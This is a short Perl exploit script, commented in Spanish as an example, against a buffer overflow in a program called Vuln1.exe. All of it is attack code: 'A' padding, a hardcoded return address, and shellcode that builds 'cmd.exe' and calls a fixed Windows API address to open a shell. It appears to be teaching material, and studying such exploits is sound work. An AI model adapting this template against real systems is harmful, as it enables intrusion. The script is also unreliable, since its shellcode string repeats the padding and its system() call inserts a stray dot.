#
# Exploit ejemplo
# ###############

#!/usr/bin/perl



#my $nop="\x90" x 20;

my $file= "Vuln1.exe ";

my $basura = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
my $offset = "\x7B\x46\x86\x7C";

my $shellcode = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x7B\x46\x86\x7C\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45\xF8\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";


$programa = $basura.$offset.$shellcode; 

system("$file.$programa");